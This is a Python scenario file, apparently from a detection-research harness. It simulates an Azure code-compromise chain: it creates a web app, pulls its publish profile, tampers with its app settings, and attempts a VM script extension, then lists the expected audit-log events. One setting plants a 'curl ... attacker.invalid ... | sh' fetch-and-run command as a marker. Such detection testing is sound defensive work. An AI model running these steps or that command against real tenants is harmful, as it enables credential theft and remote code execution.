"""AZ-CODE-01 code_compromise: web app + publish profile + config tamper (live, Free tier); VM extension (attempt)."""
from research.scenarios.base import Expect
from research.scenarios.azure._common import AzureScenario


class Scenario(AzureScenario):
    id = "AZ-CODE-01"
    impact_class = "code_compromise"
    mode = "live+denied-but-logged"  # the VM-extension write targets a VM that doesn't exist
    expected = [
        Expect("Microsoft.Web/sites/write", "code_compromise", 4),
        Expect("Microsoft.Web/sites/publishxml/action", "code_compromise", 3),
        Expect("Microsoft.Web/sites/config/write", "code_compromise", 4),
        Expect("Microsoft.Compute/virtualMachines/extensions/write", "code_compromise", 4, optional=True),
    ]

    def act(self) -> None:
        self.ensure_rg()
        plan, app = self.name("btplan", 30), self.name("btapp", 40)
        api = "2022-09-01"
        self.put("serverfarms/write", f"/providers/Microsoft.Web/serverfarms/{plan}", api,
                 {"location": self.location, "sku": {"name": "F1", "tier": "Free"}}, wait=False)
        site = f"/providers/Microsoft.Web/sites/{app}"
        self.put("sites/write", site, api,
                 {"location": self.location, "properties": {"serverFarmId": self.rg_path(f"/providers/Microsoft.Web/serverfarms/{plan}")}},
                 wait=False)
        self.arm.wait_provisioned(self.rg_path(site), api)
        self.call("sites/publishxml", "POST", self.rg_path(site + "/publishxml"), api, {"format": "WebDeploy"})
        self.call("sites/config/appsettings", "PUT", self.rg_path(site + "/config/appsettings"), api,
                  {"properties": {"STARTUP_CMD": "curl -s http://attacker.invalid/x | sh  # benign marker"}})
        self.call("virtualMachines/extensions/write", "PUT",
                  self.rg_path("/providers/Microsoft.Compute/virtualMachines/does-not-exist/extensions/cse"), "2023-09-01",
                  {"location": self.location, "properties": {"publisher": "Microsoft.Azure.Extensions", "type": "CustomScript",
                                                             "typeHandlerVersion": "2.1", "settings": {"commandToExecute": "echo benign"}}},
                  allow=(400, 404, 409))


SCENARIO = Scenario
